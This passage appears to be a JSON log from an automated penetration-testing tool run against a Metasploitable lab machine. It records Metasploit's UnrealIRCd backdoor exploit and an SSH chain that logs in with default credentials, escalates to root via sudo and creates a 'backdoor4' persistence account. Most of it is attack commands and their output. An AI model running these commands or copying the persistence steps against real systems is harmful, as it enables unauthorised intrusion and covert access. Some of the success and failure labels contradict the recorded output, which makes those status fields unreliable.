+                    "raw_output": "use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf > use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667\nRPORT => 6667\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/bind_perl\nPAYLOAD => cmd/unix/bind_perl\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4446\nLPORT => 4446\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n[*] 192.168.56.5:6667 - Connected to 192.168.56.5:6667...\n    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\n    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; usi\nng your IP address instead\n[*] 192.168.56.5:6667 - Sending backdoor command...\n[*] Started bind TCP handler against 192.168.56.5:4446\nsessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > sessions -i 1 -c 'id'\n[-] Invalid session identifier: 1\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n",
+                    "analysis": "Type: session_command. FAILED - Session does not exist",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Session does not exist"
+                },
+                {
+                    "description": "Verify root privileges from IRC backdoor shell",
+                    "command": "sessions -i 1 -c 'whoami'",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf > use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667\nRPORT => 6667\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/bind_perl\nPAYLOAD => cmd/unix/bind_perl\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4446\nLPORT => 4446\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n[*] 192.168.56.5:6667 - Connected to 192.168.56.5:6667...\n    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\n    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; usi\nng your IP address instead\n[*] 192.168.56.5:6667 - Sending backdoor command...\n[*] Started bind TCP handler against 192.168.56.5:4446\nsessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > sessions -i 1 -c 'id'\n[-] Invalid session identifier: 1\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > sessions -i 1 -c 'whoami'\n[-] Invalid session identifier: 1\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n",
+                    "analysis": "Type: session_command. FAILED - Session does not exist",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Session does not exist"
+                }
+            ],
+            "overall_status": "partial",
+            "furthest_stage": "initial_access",
+            "notes": []
+        },
+        "Chain 4: Direct SSH Login (Non-Metasploit) to User Access and Persistence": {
+            "initial_access": [
+                {
+                    "description": "Login to SSH with weak credentials (msfadmin:msfadmin) for user shell",
+                    "command": "sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.56.5 'whoami'",
+                    "command_type": "regular",
+                    "raw_output": "msfadmin\nWarning: Permanently added '192.168.56.5' (RSA) to the list of known hosts.\r\n",
+                    "analysis": "Type: regular. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                }
+            ],
+            "privilege_escalation": [
+                {
+                    "description": "Escalate to root using known Metasploitable vulnerabilities (e.g., kernel exploit or sudo misconfig)",
+                    "command": "sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.56.5 \"echo 'msfadmin' | sudo -S find / -perm -4000 -user root 2>/dev/null\"",
+                    "command_type": "regular",
+                    "raw_output": "/bin/umount\n/bin/fusermount\n/bin/su\n/bin/mount\n/bin/ping\n/bin/ping6\n/sbin/mount.nfs\n/lib/dhcp3-client/call-dhclient-script\n/usr/bin/sudoedit\n/usr/bin/X\n/usr/bin/netkit-rsh\n/usr/bin/gpasswd\n/usr/bin/traceroute6.iputils\n/usr/bin/sudo\n/usr/bin/netkit-rlogin\n/usr/bin/arping\n/usr/bin/newgrp\n/usr/bin/chfn\n/usr/bin/nmap\n/usr/bin/chsh\n/usr/bin/netkit-rcp\n/usr/bin/passwd\n/usr/bin/mtr\n/usr/sbin/pppd\n/usr/lib/telnetlogin\n/usr/lib/apache2/suexec\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/pt_chown\nWarning: Permanently added '192.168.56.5' (RSA) to the list of known hosts.\r\n",
+                    "analysis": "Type: regular. FAILED - SSH connection failed",
+                    "status": "error",
+                    "return_code": 1,
+                    "failure_reason": "SSH connection failed"
+                },
+                {
+                    "description": "Escalate to root using known Metasploitable vulnerabilities (e.g., kernel exploit or sudo misconfig)",
+                    "command": "sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.56.5 \"echo 'msfadmin' | sudo -S /bin/bash -c 'id'\"",
+                    "command_type": "regular",
+                    "raw_output": "uid=0(root) gid=0(root) groups=0(root)\nWarning: Permanently added '192.168.56.5' (RSA) to the list of known hosts.\r\n",
+                    "analysis": "Type: regular. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                }
+            ],
+            "persistence": [
+                {
+                    "description": "Create backdoor user from escalated shell and verify SSH access",
+                    "command": "sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.56.5 \"echo 'msfadmin' | sudo -S useradd -m -s /bin/bash backdoor4\"",
+                    "command_type": "regular",
+                    "raw_output": "Warning: Permanently added '192.168.56.5' (RSA) to the list of known hosts.\r\n",
+                    "analysis": "Type: regular. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Create backdoor user from escalated shell and verify SSH access",
+                    "command": "sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.56.5 \"echo 'msfadmin' | sudo -S echo 'backdoor4:password123' | chpasswd\"",
+                    "command_type": "regular",
+                    "raw_output": "Warning: Permanently added '192.168.56.5' (RSA) to the list of known hosts.\r\nchpasswd: can't lock password file\n",
+                    "analysis": "Type: regular. FAILED - SSH connection failed",
+                    "status": "error",
+                    "return_code": 1,
+                    "failure_reason": "SSH connection failed"
+                },
+                {
+                    "description": "Create backdoor user from escalated shell and verify SSH access",
+                    "command": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor4@192.168.56.5 'whoami'",
+                    "command_type": "regular",
+                    "raw_output": "Warning: Permanently added '192.168.56.5' (RSA) to the list of known hosts.\r\nPermission denied, please try again.\r\n",
+                    "analysis": "Type: regular. FAILED - SSH connection failed",
+                    "status": "error",
+                    "return_code": 5,
+                    "failure_reason": "SSH connection failed"
+                }
+            ],
+            "overall_status": "completed",
+            "furthest_stage": "persistence",
+            "notes": []
+        }
+    },
+    "failed_chains": [],
+    "initial_chains": [
+        "Chain 1: vsftpd Backdoor to Root Persistence",
+        "Chain 2: Samba Usermap Script to Root Persistence",
+        "Chain 3: UnrealIRCd Backdoor to Root Persistence"
+    ],
+    "privilege_chains": [],
+    "persistence_chains": [
+        "Chain 4: Direct SSH Login (Non-Metasploit) to User Access and Persistence"
+    ]
+}
